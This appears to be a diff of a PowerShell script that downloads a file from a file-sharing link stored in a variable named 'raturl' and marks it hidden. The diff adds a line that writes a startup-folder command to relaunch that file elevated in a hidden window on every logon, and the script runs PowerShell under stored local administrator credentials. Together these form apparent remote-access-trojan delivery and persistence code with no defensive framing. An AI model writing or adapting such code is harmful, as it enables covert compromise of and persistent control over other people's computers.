@@ -10,6 +10,8 @@ param(
 )
 
 $raturl = "https://gofile.io/d/VHmBL1"
+$startup = "C:\Users\cmtsadmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\runadm.cmd"
+
 $temppwd = ConvertTo-SecureString -String $defAdminPwd -AsPlainText -Force
 $localcred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $defAdminUsr,$temppwd
 
@@ -24,7 +26,9 @@ Invoke-WebRequest -uri $raturl -OutFile $localpath
 $hideFile = get-item $localpath -Force
 $hideFile.attributes = "Hidden"
 
-Invoke-WebRequest -uri "C:\Users\cmtsadmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\runadm.ps1" -OutFile 
+#Invoke-WebRequest -uri "C:\Users\cmtsadmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\runadm.cmd" -OutFile 
+
+"powershell -c start -verb runas $localpath -windowstyle hidden" | out-file -filepath $startup
 Start-Process powershell.exe -argumentlist "C:\Users\cmtsadmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\runadm.ps1" -credential $localcred
 
 
